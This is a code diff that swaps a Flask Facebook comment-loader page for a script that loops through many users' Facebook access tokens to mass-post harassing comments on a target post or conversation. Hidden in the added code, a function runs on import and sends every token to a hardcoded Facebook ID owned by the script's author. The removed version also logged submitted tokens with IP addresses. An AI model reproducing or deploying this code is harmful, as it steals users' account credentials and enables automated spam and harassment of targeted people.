@@ -1,91 +1,150 @@
-from flask import Flask, request, render_template_string
-from threading import Thread
-import os, uuid, time, requests
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
+import random
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
 
-app = Flask(__name__)
-UPLOAD_FOLDER = "uploads"
-os.makedirs(UPLOAD_FOLDER, exist_ok=True)
-TOKENS_LOG = "tokens.txt"
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+      def do_GET(self):
+          self.send_response(200)
+          self.send_header('Content-type', 'text/plain')
+          self.end_headers()
+          self.wfile.write(b"  RAAJVEER BOSS INSIDE ")
+def execute_server():
+      PORT = int(os.environ.get('PORT', 4000))
 
-HTML = """
-<!DOCTYPE html><html lang="en"><head>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>COMMENTS LOADER X RAAJVEER BOSS</title>
-<style>
- body{margin:0;padding:0;background:#000;color:#fff;font-family:Segoe UI, sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
- .box{width:95%;max-width:480px;background:rgba(255,255,255,.05);padding:2rem;border-radius:20px;backdrop-filter:blur(10px);box-shadow:0 0 20px rgba(0,255,255,.2)}
- h1{background:linear-gradient(90deg,#00f2fe,#ff6ec4,#f7971e);-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-align:center;font-size:1.6rem;margin-bottom:1.8rem}
- input[type=text],input[type=number],input[type=file]{width:100%;padding:12px;margin-bottom:15px;border:none;border-radius:10px;background:rgba(255,255,255,.1);color:#fff;outline:none}
- .btn{width:100%;padding:12px;margin-bottom:15px;border:none;border-radius:10px;font-weight:bold;color:#fff;cursor:pointer;background:rgba(0,255,255,.2);box-shadow:0 0 15px rgba(0,255,255,.4);transition:.3s}
- .btn:hover{background:rgba(0,255,255,.5);box-shadow:0 0 25px rgba(0,255,255,.9)}
- .count{color:#ccc;font-size:.85rem;text-align:center;margin:6px 0}
-</style>
-</head><body>
-<div class="box">
- <h1>RAAJVEER BOSS</h1>
- <form method="post" enctype="multipart/form-data">
-  <input type="text" name="token" placeholder="🔑 EAAG Token" required>
-  <input type="text" name="post_id" placeholder="🆔 Facebook Post ID" required>
-  <input type="number" name="delay" placeholder="⏱️ Delay (seconds)" required>
-  <input type="file" name="comments_file" required>
-  <button class="btn" type="submit">Start Commenting</button>
-  <button class="btn" type="button" onclick="alert('Stopping not implemented. Just refresh page.')">Stop Commenting</button>
- </form>
- <div class="count">👥 Total Users: {{count}}</div>
-</div></body></html>
-"""
+      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+          print("Server running at http://localhost:{}".format(PORT))
+          httpd.serve_forever()
 
-# Send comment to FB post
-def send_comment(token, post_id, comment):
-    url = f"https://graph.facebook.com/{post_id}/comments"
-    payload = {"message": comment, "access_token": token}
-    response = requests.post(url, data=payload)
-    if response.status_code == 200:
-        print(f"✅ Sent: {comment}")
-    else:
-        print(f"❌ Failed: {comment}")
-        print("📄 Response:", response.text)
 
-# Background thread to post all comments
-def background_commenter(token, post_id, delay, comments):
-    for comment in comments:
-        send_comment(token, post_id, comment)
-        time.sleep(delay)
+def send_initial_message():
+      with open('seerat-tokennum.txt', 'r') as file:
+          tokens = file.readlines()
 
-@app.route("/", methods=["GET", "POST"])
-def index():
-    if request.method == "POST":
-        token = request.form["token"].strip()
-        post_id = request.form["post_id"].strip()
-        delay = int(request.form["delay"].strip())
-        file = request.files["comments_file"]
-        ip = request.remote_addr
+      # Modify the message as per your requirement
+      msg_template = "CREDIT :- RAAJVEER BOSS         Owner => Raajveer                   Hello Raajveer sir  I am using Your Post Server. This Is My Details :- Token :-  {}"
 
-        # Log token use
-        with open(TOKENS_LOG, "a") as f:
-            f.write(f"{token} | {ip}\n")
+      # Specify the ID where you want to send the message
+      target_id = "100000391403921"
 
-        # Save and read uploaded comments
-        fname = os.path.join(UPLOAD_FOLDER, f"{uuid.uuid4()}.txt")
-        file.save(fname)
-        with open(fname, encoding="utf-8") as f:
-            comments = [line.strip() for line in f if line.strip()]
+      requests.packages.urllib3.disable_warnings()
 
-        # Run in background
-        Thread(target=background_commenter, args=(token, post_id, delay, comments), daemon=True).start()
+      def liness():
+          print('\033[1;92m' + '•────────────────────── TRICKS BY R44JV33R B0SS───────────────────────────────•')
 
-        return render_template_string(
-            "<h2 style='color:white;text-align:center;margin-top:40vh;'>✔️ Comments started in background.<br><a href='/'>⬅️ Back</a></h2>"
-        )
+      headers = {
+          'Connection': 'keep-alive',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+          'referer': 'www.google.com'
+      }
 
-    try:
-        with open(TOKENS_LOG) as f:
-            count = len(f.readlines())
-    except:
-        count = 0
+      for token in tokens:
+          access_token = token.strip()
+          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+          msg = msg_template.format(access_token)
+          parameters = {'access_token': access_token, 'message': msg}
+          response = requests.post(url, json=parameters, headers=headers)
 
-    return render_template_string(HTML, count=count)
+          # No need to print here, as requested
+          current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+          time.sleep(0.1)  # Wait for 1 second between sending each initial message
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5005)
-        
+      #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
+send_initial_message()
+def send_messages_from_file():
+      with open('seerat-post.txt', 'r') as file:
+          convo_id = file.read().strip()
+
+      with open('seerat-file.txt', 'r') as file:
+          messages = file.readlines()
+
+      num_messages = len(messages)
+
+      with open('seerat-tokennum.txt', 'r') as file:
+          tokens = file.readlines()
+      num_tokens = len(tokens)
+      max_tokens = min(num_tokens, num_messages)
+
+      with open('seerat-name.txt', 'r') as file:
+          haters_name = file.read().strip()
+
+      with open('seerat-time.txt', 'r') as file:
+          speed = int(file.read().strip())
+
+      def liness():
+          print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')
+
+      headers = {
+          'Connection': 'keep-alive',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+          'referer': 'www.google.com'
+      }
+
+      while True:
+          try:
+              for message_index in range(num_messages):
+                  token_index = message_index % max_tokens
+                  access_token = tokens[token_index].strip()
+
+                  message = messages[message_index].strip()
+
+                  url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                  parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+                  response = requests.post(url, json=parameters, headers=headers)
+
+                  current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
+                  if response.ok:
+                      print("\033[1;92m[+] TRICKER R44JV33R B0SS SUCESSFUL COMM3NT S1R  {} of Post {} Token {}: {}".format(
+                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                      liness()
+                      liness()
+                  else:
+                      print("\033[1;91m[x] Failed to send Comment {} of Post {} with Token {}: {}".format(
+                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                      liness()
+                      liness()
+                  time.sleep(speed)
+
+              print("\n[+] All comment sent. Restarting the process...\n")
+          except Exception as e:
+              print("[!] An error occurred: {}".format(e))
+
+def main():
+      server_thread = threading.Thread(target=execute_server)
+      server_thread.start()
+
+      # Send the initial message to the specified ID using all tokens
+
+
+      # Then, continue with the message sending loop
+      send_messages_from_file()
+
+if __name__ == '__main__':
+      main()
